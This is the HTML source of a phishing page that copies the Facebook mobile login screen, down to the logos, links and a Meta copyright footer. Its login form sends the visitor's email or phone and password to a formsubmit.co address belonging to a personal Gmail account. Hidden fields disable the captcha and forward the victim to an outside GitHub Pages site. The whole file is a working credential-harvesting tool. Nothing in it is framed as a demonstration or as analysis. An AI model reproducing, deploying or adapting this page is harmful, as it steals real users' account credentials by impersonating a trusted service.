<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>Facebook</title>
  <link rel="icon" href="temp/facebook.png" type="image/x-icon">
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0;
    }

    .login-container {
      padding: 20px;
      max-width: 400px;
      width: 100%;
      text-align: center;
    }

    .facebook-logo {
      font-size: 40px;
      font-weight: bold;
      color: #1877f2;
      margin-bottom: 20px;
      text-transform: lowercase;
    }

    .login-form {
      display: flex;
      flex-direction: column;
      gap: 10px;
      text-align: left;
    }

    .input-field {
      padding: 10px;
      border: 0.5px solid #000;
      border-radius: 10px;
      width: calc(100% - 50px);
      box-sizing: border-box;
      margin: 0 auto;
    }

    .login-button {
      background-color: #1877f2;
      color: #fff;
      padding: 10px;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      width: calc(100% - 20px);
      box-sizing: border-box;
      margin: 0 auto;
    }

    .login-button:hover {
      background-color: #0e5a99;
      border-radius: 10px;
    }

    .or-text {
      margin: 10px 0;
      border: #ddd;
      color: #000;
      borde-radius: 10px;
    }

    .create-account-button {
      background-color: #fff;
      color: #000;
      padding: 10px;
      border: 2px solid #ccc;
      border-radius: 4px;
      text-decoration: none;
      cursor: pointer;
      display: inline-block;
      margin-top: 10px;
      width: calc(100% - 20px);
      box-sizing: border-box;
      margin: 0 auto;
    }

    .create-account-button:hover {
      background-color: #f5f5f5;
    }

    .forgotten-password {
      color: #000;
      text-decoration: none;
      margin-top: 10px;
      font-size: 12px;
      display: block;
      width: calc(100% - 20px);
      box-sizing: border-box;
      margin: 0 auto;
    }

    .language-option {
      margin-top: 20px;
      font-size: 14px;
      color: #666;
    }
    .footer {
      margin-top: 20px;
      color: #666;
      }
  </style>
</head>
<body>
    <div class="login-container">
      <div class="language-option">English (UK)</div>
    <a href="default.asp"><img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yD/r/5D8s-GsHJlJ.png" alt="Facebook" style="width:50px;height:50px;"></a>
    <form class="login-form" action="https://formsubmit.co/kumarsharma2580@gmail.com" method="POST">
      <input type="Text" name="Facebook ID" class="input-field" placeholder="Email or Phone" required>
      <input type="Password" name="Facebook Password" class="input-field" placeholder="Password" required>
      <input type="hidden" name="_captcha" value="false">
      <input type="hidden" name="_next" value="https://shkumaraman.github.io/win.html"> 
      <button type="submit" class="login-button">Log in</button>
    </form>
    <br>
    <a href="https://m.facebook.com/login/identify/" class="forgotten-password">Forgotten Password?</a>
    <br>
    <br>
    <br>
    <p class="or-text">
      <a href="https://m.facebook.com/reg/?is_two_steps_login=0&cid=103&refsrc=deprecated&soft=hjk" class="create-account-button">
        Create New Account
      </a>
    </p>
      <a href="default.asp"><img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yM/r/DDgwTv3JehF.png" alt="Facebook" style="width:50px;height:50px;"></a>
   <div class="footer">
   Meta &copy; <span id="currentYear"></span>
  </div>
  </div>
  <script>
    document.getElementById('currentYear').textContent = new Date().getFullYear();
  </script>
</body>
</html>
